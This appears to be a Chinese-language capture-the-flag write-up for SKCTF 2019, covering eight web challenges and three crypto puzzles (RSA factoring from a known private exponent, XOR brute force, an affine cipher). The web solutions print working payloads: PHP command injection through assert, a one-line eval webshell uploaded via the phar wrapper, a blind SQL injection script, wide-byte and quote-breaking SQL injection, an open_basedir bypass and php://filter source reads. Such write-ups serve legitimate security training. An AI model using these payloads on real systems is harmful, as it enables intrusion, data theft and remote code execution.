# web
## web1
- 修改前端改变元素属性，flag按钮得到源码

- `assert("file_exists('$page')");`闭合进行命令执行

- payload:

  ```
  file=test'.system('cat ./.ffll44gg').'
  ```

## web2

扫描发现`show.php`

上传一个图片后发现url变为`f=show&imageid=xxx`，猜测f参数是包含的文件名，并且自动加`.php`后缀

这里可以利用phar伪协议绕过自动加上php后缀的限制

新建一个`shell.php`内容为`<?php eval($_POST[cmd]); ?>`，压缩为zip文件，然后修改为png后缀上传,得到上传的路径，用phar伪协议包含

![Vo4LND.png](https://s2.ax1x.com/2019/06/15/Vo4LND.png)

## web3

简单的盲注 

过滤了`空格`,`,`,`for`,`and`,`%0d`,`%0a`等字符 利用括号和from绕过即可

exp:
```
# -*- coding: utf-8 -*-
import requests
url = 'http://192.168.138.12:8002/'
def check(payload):
    postdata = {'username':payload,'password':'xx'}
    r = requests.post(url, postdata).content
    return 'Username Wrong' in r

password  = ''
s = r'0123456789abcdef'

for i in xrange(32,0,-1):
    for c in s:
        payload = '\'or(mid((select(password)from(admin))from(%d))<>\'%s\')#' % (i, (c+password))
        if check(payload):
            password = c + password
            break
    print password
```

## web4
宽字节注入

payload:
```
?id=0%df%27union%20select%20flag,2,3%20from%20flag%23
```

## web5

题目限制`open_basedir`为`/var/www/html`，而flag在根目录中，同时禁用了所用能用来执行命令的函数

`open_basedir`绕过payload：
```
chdir('image');ini_set('open_basedir','..');chdir('..');chdir('..');chdir('..');chdir('..');ini_set('open_basedir','/');echo(file_get_contents('flag'));
```

## web6

base64忽略不在编码范围内的字符,php伪协议读源码得到flag

payload:
```
*c*G*h*w*O*i*8*v*Z*m*l*s*d*G*V*y*L*3*J*l*Y*W*Q*9*Y*2*9*u*d*m*V*y*d*C*5*i*Y*X*N*l*N*j*Q*t*Z*W*5*j*b*2*R*l*L*3*J*l*c*2*9*1*c*m*N*l*P*W*Z*s*Y*W*c*u*c*G*h*w*
```

## web7

`string sprintf( string $format[, mixed $args[, mixed $...]] )`

Returns a string produced according to the formatting string format. 


payload：
```
?myname=%s
```

## web8

- 爆破，收集信息得到目录
- ![Vo52rt.png](https://s2.ax1x.com/2019/06/15/Vo52rt.png)
  - 尝试add.php上传，看页面反应猜测只有前端只起迷惑作用。
- 文件包含，得到源码
  - 在`test.php`提示`put file parameter`猜测有文件包含漏洞
  - POST传入`file=php://filter/read=convert.base64-encode/resource=add.php`等等得到所有base64编码后的源码,base64解码得到源码
- 审计源码，查看sql过滤、上传过滤方式
  - sql过滤为：把`'`代替为空格，不好闭合。但是可以使第一个`‘`和第三个`'`来闭合注入使得sql语句为：即把`'`变成内容字符，而不是作为一个对于sql特殊意义的符号即可
    - `select * from skctf2019_admin where  password='\' and username=' or 1=1;#'`
    - ![Vo5y2d.png](https://s2.ax1x.com/2019/06/15/Vo5y2d.png)
  - upload过滤为：
    - 黑名单检测，去除后缀。双写即可绕过（还有很多别的绕过方式）
- 注入后登陆
- 上传得到shell
- 蚁剑连接，找到flag

# crypto
## rsa
已知n、e、d,求p、q

```
#!/usr/bin/env python2
# coding: utf-8
# 已知 d，求 p，q

import random
from md5 import md5

def gcd(a, b):
    if a < b:
        a, b = b, a
    while b != 0:
        temp = a % b
        a = b
        b = temp
    return a


def getpq(n, e, d):
    p = 1
    q = 1
    while p == 1 and q == 1:
        k = d * e - 1
        g = random.randint(0, n)
        while p == 1 and q == 1 and k % 2 == 0:
            k /= 2
            y = pow(g, k, n)
            if y != 1 and gcd(y-1, n) > 1:
                p = gcd(y-1, n)
                q = n/p
    return p, q



n = 16352578963372306131642407541567045533766691177138375676491913897592458965544068296813122740126583082006556217616296009516413202833698268845634497478988128850373221853516973259086845725813424850548682503827191121548693288763243619033224322698075987667531863213468223654181658012754897588147027437229269098246969811226129883327598021859724836993626315476699384610680857047403431430525708390695622848315322636785398223207468754197643541958599210127261345770914514670199047435085714403641469016212958361993969304545214061560160267760786482163373784437641808292654489343487613446165542988382687729593384887516272690654309  
e = 65537
d = 9459928379973667430138068528059438139092368625339079253289560577985304435062213121398231875832264894458314629575455553485752685643743266654630829957442008775259776311585654014858165341757547284112061885158006881475740553532826576260839430343960738520822367975528644329172668877696208741007648370045520535298040161675407779239300466681615493892692265542290255408673533853011662134953869432632554008235340864803377610352438146264524770710345273439724107080190182918285547426166561803716644089414078389475072103315432638197578186106576626728869020366214077455194554930725576023274922741115941214789600089166754476449453

p, q = getpq(n, e, d)
assert(p*q == n)
print p, q

print "Flag: SKCTF{%s}" %md5(str(p + q)).hexdigest()
```

## xor

简单的异或，爆破key
```
from base64 import b64decode
file=open("xor.txt","r").read()
# rJeekZuQkZjfqpGWiZqNjJaLht+Qmd+snJaakZya356Rm9+rmpyXkZCTkJiG9b6bm42ajIzFysjG366WnpGInpGYnpGY362QnpvT37eKnpGYm56Q37uWjIuNlpyL09+ulpGYm56Q09+sl56Rm5CRmN+vjZCJlpGcmtPfzcnJysbP09+v0a3RvJeWkZ71rLS8q7mEzpvJnsnLm8rGzc/Nyp7LzcbNmp2Zy5mZxpyZxsvOzsuC

ciphertext = b64decode(file)

for key in range(256):
    plaintext=''
    for i in ciphertext:
        plaintext+=chr(key^ord(i))
    if "SKCTF{" in plaintext:
        print plaintext

# Shandong University of Science and Technology
# Address:579 Qianwangang Road, Huangdao District, Qingdao, Shandong Province, 266590, P.R.China
# SKCTF{1d6a64d592025a4292ebf4ff9cf94114}
```

## 抓捕贪污犯
Affine密码
```
#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @Author  : Dxx

#flag{QIBAIBASHIYIWANTOMYCARD}
#密钥：a=25 b=14 (mod 26)

import gmpy2

#已知两个不同字符加密前后的字母即可得出Affine密码的密钥a和b
#E(B)=a*B+b (mod 26) = N
#E(I)=a*I+b (mod 26) = G

#即13=1*a+b (mod 26)
#即 6=8*a+b (mod 26)
#两式子相减可求得密钥a，进而可以求得密钥b
#相减得 -7=7*a (mod 26)
#即 a=-7*7^-1 = 19 * 7^-1
#注意:所有运算在模26下运算（包括求逆元）

re = gmpy2.invert(7,26)
a = (19*re) % 26
b = (13-a)%26


def decrypt(key, c):
    return ''.join([unshift([a, b], ch) for ch in c])

def unshift(key, ch):
    offset = ord(ch) - ord('A')
    return chr((((key[0] * offset) + key[1]) % 26) + ord('A'))

if __name__ == '__main__':
	c = 'YGNOGNOWHGQGSOBVACQMOXL'
	key = [a,b]
	print decrypt(key,c)
```